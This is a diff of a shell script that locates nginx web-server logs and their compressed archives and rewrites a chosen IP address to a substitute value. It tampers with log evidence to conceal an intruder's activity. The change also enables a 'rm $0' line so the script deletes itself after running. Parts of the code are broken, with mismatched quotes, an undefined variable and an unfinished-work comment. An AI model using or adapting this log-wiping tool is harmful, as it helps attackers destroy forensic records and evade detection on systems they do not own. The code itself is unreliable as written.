@@ -29,9 +29,10 @@ info="`lsof 2>/dev/null -iTCP -sTCP:LISTEN -PN |grep  '*:80\|*:443' 2> /dev/null
 web_srv="`printf "$info\n"|awk {' print $1 '}|uniq`"
 #logs
 for line in "`lsof 2>/dev/null| grep nginx | grep log  | awk {' print '$number' '} | sort | uniq | sed 's/ //g'`";do 
-[ "`grep -m 1  $ip $line`" ]&& sed 's/'$ip'/'$replace'/g' $line >/tmp/$(basename $line) ### change it for log name ! 
+[ "`grep -m 1  $ip $line`" ]&& sed 's/'$ip'/'$replace'/g' $line >/tmp/$(basename $line) 
+### change it for log name ! 
 [ -f "$line.*.$zip_type" ]&& echo "old compressed logs found ! " && for zp in  $(ls $line.*.$zip_type) ;do 	
 gzip -cdk $zp | sed 's/'$ip'/'$target'/g' | gzip >/tmp/$(basename $zp)" ;echo " mv /tmp/$(basename $zp) $line.$(basename $zp) ;done || echo "no such compressed log were found " 
 ### needz to more workout on file name and path. I'm too tired now.
 done
-#rm $0
+rm $0
